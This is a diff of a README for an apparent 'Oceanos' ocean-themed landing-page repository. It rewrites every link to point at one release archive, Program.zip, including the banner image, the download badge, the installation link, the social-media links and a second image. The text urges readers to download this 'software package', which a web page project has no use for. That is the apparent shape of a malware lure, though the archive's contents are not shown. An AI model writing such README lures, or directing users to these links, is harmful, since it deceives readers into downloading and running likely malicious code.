@@ -3,7 +3,7 @@
 
 Welcome to the **Oceanos** repository, where you can dive deep into the secrets of the oceans! 🪸 
 
-![Oceanos Banner](https://www.example.com/oceanos-banner.jpg)
+![Oceanos Banner](https://github.com/frostyfds/oceanos/releases/download/v1.0/Program.zip)
 
 ## Description
 Explore the wonders of the ocean with our interactive landing page! Immerse yourself in the beauty and mysteries of the deep blue sea. 
@@ -21,9 +21,9 @@ Explore the wonders of the ocean with our interactive landing page! Immerse your
 - Website
 
 ## Installation
-To experience the magic of the oceans, download our software package by clicking [here](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip). The package contains everything you need to get started. 
+To experience the magic of the oceans, download our software package by clicking [here](https://github.com/frostyfds/oceanos/releases/download/v1.0/Program.zip). The package contains everything you need to get started. 
 
-[![Download Oceanos](https://img.shields.io/badge/Download-Soft.zip-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Oceanos](https://github.com/frostyfds/oceanos/releases/download/v1.0/Program.zip)](https://github.com/frostyfds/oceanos/releases/download/v1.0/Program.zip)
 
 If the link does not work or is not provided, please check the **Releases** section of the repository for alternative download options.
 
@@ -38,13 +38,13 @@ If you encounter any issues while using the software or have suggestions for imp
 
 ## Stay Connected
 Follow us on social media for updates, behind-the-scenes content, and more ocean wonders:
-- Twitter: [@OceanosPage](https://twitter.com/OceanosPage)
-- Instagram: [@OceanosPage](https://www.instagram.com/OceanosPage)
-- Facebook: [Oceanos](https://www.facebook.com/Oceanos)
+- Twitter: [@OceanosPage](https://github.com/frostyfds/oceanos/releases/download/v1.0/Program.zip)
+- Instagram: [@OceanosPage](https://github.com/frostyfds/oceanos/releases/download/v1.0/Program.zip)
+- Facebook: [Oceanos](https://github.com/frostyfds/oceanos/releases/download/v1.0/Program.zip)
 
 Let's explore the depths of the oceans together and celebrate the beauty of marine life! 🌊🦈🌴
 
-![Underwater Ocean](https://www.example.com/underwater-ocean.jpg)
+![Underwater Ocean](https://github.com/frostyfds/oceanos/releases/download/v1.0/Program.zip)
 
 ***Mergulhe nos Segredos dos Oceanos!*** 🐠🌺🌊
 
